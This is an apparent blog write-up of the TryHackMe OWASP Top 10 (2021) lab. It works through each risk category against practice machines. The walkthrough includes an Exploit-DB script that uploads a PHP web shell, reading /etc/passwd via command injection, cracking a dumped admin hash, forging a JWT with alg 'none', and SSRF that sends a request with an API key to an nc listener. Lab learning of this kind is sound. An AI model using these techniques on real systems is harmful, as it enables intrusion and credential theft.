---
title: "[THM] OWASP Top 10 (2021)"
author: "Wook Lee"
date: "2024-06-30"
tags: ["TryHackMe"]
---

### What is OWASP?

The **Open Web Application Security Project, or OWASP**, is an international non-profit organization dedicated to **web application security**. One of OWASP's core principles is that all of their materials be freely available and easily accessible on their website, making it possible for anyone to improve their own web application security.

### What is OWASP Top 10?

**The OWASP Top 10** is a regularly-updated report outlining security concerns for web application security, focusing on the 10 most critical risks.

> 1. Broken Access Control
> 2. Cryptographic Failures
> 3. Injection
> 4. Insecure Design
> 5. Security Misconfiguration
> 6. Vulnerable and Outdated Components
> 7. Identification and Authentication Failures
> 8. Software and Data Integrity Failures
> 9. Security Logging & Monitoring Failures
> 10. Server-Side Request Forgery (SSRF)

---

### 1. Broken Access Control

Websites usually have pages that are protected from regular visitors. For example, only the site's admin user should be able to access a page to manage other users. If a website visitor can access protected pages they are not meant to see, then the access controls are _broken_.

#### Broken Access Control (IDOR Challenge)

**IDOR** or **Insecure Direct Object Reference** refers to an access control vulnerability where you can access resources you wouldn't normally be able to see. This occurs when the programmer exposes a **Direct Object Reference**, which is just an identifier that refers to specific objects within the server. By object, it can refer to a file, a user, a bank account in a banking application, or anything.

<br>

Deploy the machine and go to `http://MACHINE_IP` - login with the username _noot_ and the password _test1234_.

<br>
Look at other user's notes. What is the flag?

```
flag{fivefourthree}
```

![alt text](image.png#center)

```
http://10.10.255.211/note.php?note_id=0
```

![alt text](image-1.png#center)
changed the **id** in the url from 1 to 0 and revealed the flag.

### 2. Cryptographic Failures

A **cryptographic failure** refers to any vulnerability arising from the misuse of cryptographic alogrithms for protecting sensitive information. Web applications require cryptography to provide confidentiality for their users at many levels.

#### Cryptographic Failures (Challenge)

Have a look around the web app. The developer has left themselves a note indicating that there is sensitive data in a specific directory.

What is the name of the mentioned directory?

```
/assets
```

![alt text](image-2.png#center)

<br>

Navigate to the directory you found in question one. What file stands out as being likely to contain sensitive data?

```
webapp.db
```

![alt text](image-3.png#center)

<br>

Use the supporting material to access the sensitive data. What is the password hash of the admin user?

```
6eea9b7ef19179a06954edd0f6c05ceb
```

```shell
┌──(kali㉿kali)-[~/Downloads]
└─$ ls
webapp.db

┌──(kali㉿kali)-[~/Downloads]
└─$ file webapp.db
webapp.db: SQLite 3.x database, last written using SQLite version 3022000, file counter 255, database pages 7, 1st free page 5, free pages 1, cookie 0x6, schema 4, UTF-8, version-valid-for 255

┌──(kali㉿kali)-[~/Downloads]
└─$ sqlite3 webapp.db
SQLite version 3.44.2 2023-11-24 11:41:44
Enter ".help" for usage hints.
sqlite> .tables
sessions  users
sqlite> PRAGMA table_info(users);
0|userID|TEXT|1||1
1|username|TEXT|1||0
2|password|TEXT|1||0
3|admin|INT|1||0
sqlite> SELECT * FROM users;
4413096d9c933359b898b6202288a650|admin|6eea9b7ef19179a06954edd0f6c05ceb|1
23023b67a32488588db1e28579ced7ec|Bob|ad0234829205b9033196ba818f7a872b|1
4e8423b514eef575394ff78caed3254d|Alice|268b38ca7b84f44fa0a6cdc86e6301e0|0
```

<br>

Crack the hash.
What is the admin's plaintext password?

```
qwertyuiop
```

![alt text](image-4.png#center)

<br>

Login as the admin. What is the flag?

```
THM{Yzc2YjdkMjE5N2VjMzNhOTE3NjdiMjdl}
```

![alt text](image-5.png#center)

<br>

### 3. Injection

Injection flaws occur because the application interprets user-controlled input as commands or parameters.

Some common examples:

- **SQL Injection**
- **Command Injection**

The main defence for preventing injection attacks is ensuring that user-controlled input is not interpreted as queries or commands.

- **Allow list**: checks input by comparing it to a list of safe inputs. If the input is marked as safe, then it is processed. Otherwise, it's rejected.
- **Stripping input**: If the input contains dangerous characters, these are removed before processing.

#### Command Injection

Command Injection occurs when server-side code in a web app makes a call to a function that interacts with the server's console directly. An Injection web vulnerability allows an attacker to take advantage of that call to execute operating system commands arbitrarily on the server.

<br>

What strange text file is in the website's root directory?

```
drpepper.txt
```

![alt text](image-6.png#center)

<br>

How many non-root/non-service/non-daemon users are there?

```
0
```

In order to find users in Linux, we can use the following command: `cat /etc/passwd`.

![alt text](image-7.png#center)

However, there are so many users in the output. We are only interested in **non-root/non-service/non-daemon** users.

We need to remember that Linux-based systems have two types of users: `system` and `normal` users.

- `system users` are entities created by the system to run non-interactive processes, the processes that run in the background and do not require human interaction.
- `normal users` are human users created by root or another user with root privileges.

Both system and normal users in Linux have a `Unique User ID (UID)` to identify them.

- System users have UIDs in the range from `0 (root user) to 999`.
- Normal users typically receive UIDs from `1000 onwards`

I researched further to understand `/etc/passwd` file fields.

![alt text](image-8.png#center)

arrow #3 represents the UID. From the output of our commands `cat /etc/passwd`, I found only one user that has UID higher than 1000.
That is, `nobody`. However, I learned that the user 'nobody' is a reserved user created by the system. Therefore, the answer to the question is actually 0.

![alt text](image-9.png#center)

<br>

What user is this app running as?

```
apache
```

In order to find the current user, we can run the following command: `$(whoami)`
![alt text](image-10.png#center)

<br>

What is the user's shell set as?

```
/sbin/nologin
```

`$(cat /etc/passwd)` command we saw above shows that user apache's shell at the very bottom.

![alt text](image-11.png#center)

<br>

What version of Alpine Linux is running?

```
3.16.0
```

The hint of the question tells us that the version can be found in `/etc/alpine-release`.

![alt text](image-12.png#center)

<br>

### 4. Insecure Design

Insecure design refers to vulnerabilities that are inherent to the application's architecture. They are not vulnerabilities regarding bad implementations or configurations, but the idea behind the whole application (or part of it) is falwed from the start.

<br>

Navigate to http://10.10.118.28:85 and get into joseph's account. This application also has a design flaw in its password reset mechanism. Can you figure out the weakness in the proposed design and how to abuse it?

Try to reset joseph's password. keep in mind the method used by the site to validate if you are indeed joseph.

What is the value of the flag in joseph's account?

```
THM{Not_3ven_c4tz_c0uld_sav3_U!}
```

![alt text](image-13.png#center)
![alt text](image-14.png#center)

One of the security questions was very easy to guess, and there was no limit on password attempts, which is an insecure design.

<br>

### 5. Security Misconfiguration

Security Misconfigurations occur when security could have been appropriately configured but was not. Even if you download the latest up-to-date software, poor configurations could make your installation vulnerable.

Security misconfigurations include:

- Poorly configured permissions on cloud services, like S3 buckets.
- Having unnecessary features enabled, like services, pages, accounts or privileges.
- Default accounts with unchanged passwords.
- Error messages that are overly detailed and allow attackers to find out more about the system.
- Not using HTTP security headers.

<br>

Navigate to http://10.10.118.28:86/console to access the Werkzeug console.

Use the Werkzeug console to run the following Python code to execute the ls -l command on the server:
`import os; print(os.popen("ls -l").read())`

What is the database file name (the one with the .db extension) in the current directory?

```
todo.db
```

<br>

Modify the code to read the contents of the `app.py` file, which contains the application's source code. What is the value of the `secret_flag` variable in the source code?

```
THM{Just_a_tiny_misconfiguration}
```

![alt text](image-15.png#center)

<br>

### 6. Vulnerable and Outdated Components

Occasionally, you may find that the company/entity you're pen-testing is using a program with a well-known vulnerability.
It requires very little work to exploit its vulnerability because the vulnerability is already well-known. If a company misses a single update for a program they use, it could be vulnerable to any number of attacks.

Navigate to http://10.10.118.28:84 where you'll find a vulnerable application.
All the information you need to exploit it can be found online.

What is the content of the /opt/flag.txt file?

```
THM{But_1ts_n0t_my_f4ult!}
```

![alt text](image-16.png#center)
At the very top, the website clearly specifies that the site is built with PHP, MYSQL (procedure functions), and Bootstrap.

<br>

![alt text](image-17.png#center)
I googled `procedure functions bootstrap exploit` and the first result directs to `Exploit-DB`, clearly indicating we may be onto something!

<br>

![alt text](image-18.png#center)
I downloaded the exploit and ran it

<br>

```shell
┌──(kali㉿kali)-[~/Downloads]
└─$ ls
47887.py  webapp.db

┌──(kali㉿kali)-[~/Downloads]
└─$ python 47887.py
usage: 47887.py [-h] url
47887.py: error: the following arguments are required: url

┌──(kali㉿kali)-[~/Downloads]
└─$ python 47887.py http://10.10.118.28:84
> Attempting to upload PHP web shell...
> Verifying shell upload...
> Web shell uploaded to http://10.10.118.28:84/bootstrap/img/KJvupFii50.php
> Example command usage: http://10.10.118.28:84/bootstrap/img/KJvupFii50.php?cmd=whoami
> Do you wish to launch a shell here? (y/n): y
RCE $ cat /opt/flag.txt
THM{But_1ts_n0t_my_f4ult!}
```

<br>

### 7. Identification and Authentication Failures

Authentication and session management constitute core components of modern web applications.
_Authentication_ allows users to gain access to web applications by verifying their identities.
The most common form of authentication is using a username and password.
If a user enters correct credentials, the server would provide ther users' browser with a session cookie. A _session cookie_ is needed because web servers use HTTP(S) to communicate, which is stateless. Attaching session cookies means the server will know who is sending what data. The server can then keep track of user's actions.

Some common flaws in authentication mechanisms:

- Brute force attacks
- Use of weak credentials
- Weak Session Cookies

Some mitigation for broekn authentication mechanisms:

- Enforce a strong password policy
- Enforce an automatic lockout after a certain number of attempts
- Implement Multi-Factor Authentication

Many times, what happens is that developers forget to sanitize the input given by the user in the code of their application. We will focus on a vulnerability that happens because of a developer's mistake but is very easy to exploit, `re-registration`

Go to http://10.10.118.28:8088 and try to register with `darren` as your username. You'll see that the user already exists, so try to register ` darren` (whitespace at the start) instead, and you'll see that you are now logged in and can see the content present only in darren's account, which in our case, is the flag that you need to retrieve.

<br>

What is the flag that you found in darren's account?

```
fe86079416a21a3c99937fea8874b667
```

![alt text](image-19.png#center)

<br>

Now try to do the same trick and see if you can log in as `arthur`

```
d9ac0f7db4fda460ac3edeb75d75e16e
```

![alt text](image-20.png#center)

<br>

### 8. Software and Data Integrity Failures

#### What is Integrity?

When talking about integrity, we refer to the capacity we have to ascertain that a piece of data remains unmodified.
Integrity is essential in cybersecurity as we care about maintaining important data free from unwanted or malicious modifications.
A `hash` is generally mentioned as a solution for ensuring data integrity.

<br>

What is the SHA-256 hash of `https://code.jquery.com/jquery-1.12.4.min.js`?

```
sha256-ZosEbRLbNQzLpnKIkEdrPv7lOy9C27hHQ+Xp8a4MxAQ=
```

![alt text](image-21.png#center)

When a user logs into an application, they will be assigned some sort of session token that will need to be saved on the browser. This token will be repeated on each subsequent request to identify who we are. These session token can come in many forms but are usually assigned via `cookies`.

Cookies are key-value pairs that a web application will store on the user's browser and that will be automatically repeated on each request to the website that issued them. This could be a terrible idea security-wise because, cookies are stored on the user's browser, so if the user tampers with the cookie, they could potentially impersonate someone else. The application would suffer from a data integrity failure.

One solution to this is use some integry mechanisms to guarantee that cookie hasn't been altered by the user. One popular option is `JSON Web Tokens (JWT)`

JWTs are very simple tokens that allow you to store key-value pairs on a token that provides integrity as part of the token. The idea is that you can generate tokens that you can give your users with the certainty that they won't be able to alter the key-value pairs and pass the integrity check.

![alt text](image-24.png#center)
JWT token is formed of 3 parts: `Header`, `Payload` and `Signature`.

A data integrity failure vulnerability was present on some libraries implementing JWTs a while ago. The vulnerable libraries allowed attackers to bypass the signature validation by changing the two following things in a JWT:

1. Modify the header section of the token so that the `alg` header would contain the value `none`.
2. Remove the signature part.

![alt text](image-25.png#center)

<br>

Try logging into the application as guest. What is guest's account password?

```
guest
```

![alt text](image-22.png#center)

<br>

If your login was successful, you should now have a JWT stored as a cookie in your browser. Press F12 to bring out the Developer Tools.

What is the name of the website's cookie containing a JWT token?

```
jwt-session
```

![alt text](image-23.png#center)

<br>

Use the knowledge gained in this task to modify the JWT toekn so that the application thinks you are the user "admin".

What is the flag presented to the admin user?

```
THM{Dont_take_cookies_from_strangers}
```

<br>

original token: `eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6Imd1ZXN0IiwiZXhwIjoxNzE5ODk1NzI0fQ.KY3A8a6eVrLrqFt606eVjfMLYLGTRtZAwthimwQO5Lo`

We learned that the JWT token is formed of 3 parts.

- Header: `eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9`
- Payload: `eyJ1c2VybmFtZSI6Imd1ZXN0IiwiZXhwIjoxNzE5ODk1NzI0fQ`
- Signature: `KY3A8a6eVrLrqFt606eVjfMLYLGTRtZAwthimwQO5Lo`

Now we can use the encode/decode online tool to modify the contents of the header and remove signature.

First decode the `Header` part of the token
![alt text](image-26.png#center)

<br>

Modify the `alg` value to `none`
![alt text](image-27.png#center)

<br>

Decode the `Payload` part of the token
![alt text](image-28.png#center)

<br>

Modify the value of the username to `admin`
![alt text](image-29.png#center)

<br>

Remove Signature and combine those modified parts

- Header_modified: `eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0`

- Payload_modified: `eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoxNzE5ODk1NzI0fQ`

- Combined_token_modified: `eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoxNzE5ODk1NzI0fQ.`

_Notice that I still kept the dot at then end even though we removed the signature part of the token._
<br>

Replace the value of the cookie to our modified token and refresh the page
![alt text](image-30.png#center)

<br>

### 9. Security Logging and Monitoring Failures

When web applications are set up, every action performed by the user should be logged. Logging is important because if an incident occurs, the attackers' activites can be traced. Once their actions are traced, their risk and impact can be determined.

The information stored in logs should include the following:

- HTTP status codes
- Time Stamps
- Usernames
- API endpoints/page locations
- IP addresses

These logs have sensitive information so it's important to ensure that they are stored securely and that multiple copies of these logs are stored at different locations.

```shell
200 OK           12.55.22.88 jr22          2019-03-18T09:21:17 /login
200 OK           14.56.23.11 rand99        2019-03-18T10:19:22 /login
200 OK           17.33.10.38 afer11        2019-03-18T11:11:44 /login
200 OK           99.12.44.20 rad4          2019-03-18T11:55:51 /login
200 OK           67.34.22.10 bff1          2019-03-18T13:08:59 /login
200 OK           34.55.11.14 hax0r         2019-03-21T16:08:15 /login
401 Unauthorised 49.99.13.16 admin         2019-03-21T21:08:15 /login
401 Unauthorised 49.99.13.16 administrator 2019-03-21T21:08:20 /login
401 Unauthorised 49.99.13.16 anonymous     2019-03-21T21:08:25 /login
401 Unauthorised 49.99.13.16 root          2019-03-21T21:08:30 /login
```

<br>

What IP address is the attacker using?

```
49.99.13.16
```

<br>

What kind of attack is being carried out?

```
brute force
```

<br>

### 10. Server-Side Request Forgery (SSRF)

This type of vulnerability occurs when an attacker coerce a web application into sending requests on their behalf to arbitrary destinations while having control of the contents of the request itself. SSRF vulnerabilities often arise from implementations where our web applicatio nneeds to use third-party services.

Navigate to `http://MACHINE_IP`, where you'll find a simple web application. After exploring a bit, you should see an admin area, which will be our main objective. Follow the instructions on the following questions to gain access to the website's restricted area!

Explore the website. What is the only host allowed to access the admin area?

```
localhost
```

<br>

Check the "Download Resume" button. Where does the server parameter point to?

```
secure-file-storage.com
```

![alt text](image-31.png#center)

<br>

Using SSRF, make the application send the request to your AttackBox instead of the secure file storage. Are there any API keys in the intercepted request?

```
THM{Hello_Im_just_an_API_key}
```

replace `secure-file-storage.com` part with your own AttackBox IP address and run `nc -lvp 8087` command.

```shell
┌──(kali㉿kali)-[~/Desktop]
└─$ nc -lvp 8087
listening on [any] 8087 ...
10.10.245.216: inverse host lookup failed: Unknown host
connect to [10.6.67.243] from (UNKNOWN) [10.10.245.216] 34718
GET /public-docs-k057230990384293/75482342.pdf HTTP/1.1
Host: 10.6.67.243:8087
User-Agent: PycURL/7.45.1 libcurl/7.83.1 OpenSSL/1.1.1q zlib/1.2.12 brotli/1.0.9 nghttp2/1.47.0
Accept: */*
X-API-KEY: THM{Hello_Im_just_an_API_key}
```

<br>
